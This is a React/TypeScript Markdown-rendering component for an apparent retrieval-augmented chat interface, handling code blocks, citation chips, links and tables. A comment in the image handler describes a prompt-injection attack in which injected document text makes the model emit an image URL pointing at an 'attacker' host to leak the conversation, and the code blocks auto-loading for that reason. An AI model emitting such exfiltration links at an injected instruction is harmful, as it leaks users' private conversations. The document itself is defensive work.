import { Check, Copy, Terminal } from 'lucide-react';
import { memo, useState, type ReactNode } from 'react';
import ReactMarkdown, { type Components } from 'react-markdown';
import remarkGfm from 'remark-gfm';
import { linkifyCitations } from '../lib/rag/citations';

function CodeBlock({ lang, code }: { lang: string; code: string }) {
  const [copied, setCopied] = useState(false);
  const copy = () => {
    void navigator.clipboard.writeText(code).then(() => {
      setCopied(true);
      setTimeout(() => setCopied(false), 1500);
    });
  };
  return (
    <div className="not-prose my-4 overflow-hidden rounded-lg border border-gray-800 bg-[#0d0d0d]">
      <div className="flex items-center justify-between border-b border-gray-800 bg-[#171717] px-3 py-1.5">
        <span className="flex items-center gap-1.5 font-mono text-[11px] tracking-wider text-gray-400 uppercase">
          <Terminal size={12} className="text-violet-400" />
          {lang || 'code'}
        </span>
        <button onClick={copy} className="flex items-center gap-1 text-[11px] text-gray-400 hover:text-white">
          {copied ? <Check size={12} /> : <Copy size={12} />}
          {copied ? 'Copied' : 'Copy'}
        </button>
      </div>
      <pre className="scrollbar-thin overflow-x-auto p-4 font-mono text-[13px] leading-relaxed text-gray-200">
        <code>{code}</code>
      </pre>
    </div>
  );
}

interface MarkdownProps {
  content: string;
  /** Number of citable sources; [n] markers up to this become chips. */
  sourceCount?: number;
  onCite?: (n: number) => void;
  citeTitle?: (n: number) => string;
}

export const Markdown = memo(function Markdown({ content, sourceCount = 0, onCite, citeTitle }: MarkdownProps) {
  const components: Components = {
    pre: ({ children }) => <>{children}</>,
    code: ({ className, children }) => {
      const text = String(children as ReactNode);
      const lang = /language-([\w-]+)/.exec(className ?? '')?.[1];
      if (lang || text.includes('\n')) return <CodeBlock lang={lang ?? ''} code={text.replace(/\n$/, '')} />;
      return <code className="rounded bg-gray-100 px-1.5 py-0.5 font-mono text-[0.88em] text-violet-700 before:content-none after:content-none dark:bg-white/10 dark:text-violet-300">{children}</code>;
    },
    a: ({ href, children }) => {
      if (href?.startsWith('#cite-')) {
        const n = Number(href.slice(6));
        return (
          <button type="button" className="cite-chip" onClick={() => onCite?.(n)} title={citeTitle?.(n)} aria-label={`Open source ${n}`}>
            {n}
          </button>
        );
      }
      return (
        <a href={href} target="_blank" rel="noopener noreferrer" className="text-violet-600 hover:underline dark:text-violet-400">
          {children}
        </a>
      );
    },
    // Never auto-load images from model output: text injected into a document could make the
    // model emit ![](https://attacker/?q=...) and leak the conversation. Show a plain link instead.
    img: ({ src, alt }) =>
      typeof src === 'string' && /^https?:\/\//i.test(src) ? (
        <a href={src} target="_blank" rel="noopener noreferrer" className="text-violet-600 hover:underline dark:text-violet-400">
          {alt ? `Image: ${alt}` : 'Image link'}
        </a>
      ) : null,
    table: ({ children }) => (
      <div className="scrollbar-thin my-4 overflow-x-auto rounded-lg border border-gray-200 dark:border-gray-800">
        <table className="my-0 w-full text-sm">{children}</table>
      </div>
    ),
  };

  return (
    <div className="prose prose-sm prose-gray dark:prose-invert prose-headings:font-semibold prose-p:leading-relaxed prose-li:my-0.5 max-w-none text-[15px] break-words">
      <ReactMarkdown remarkPlugins={[remarkGfm]} components={components}>
        {linkifyCitations(content, sourceCount)}
      </ReactMarkdown>
    </div>
  );
});
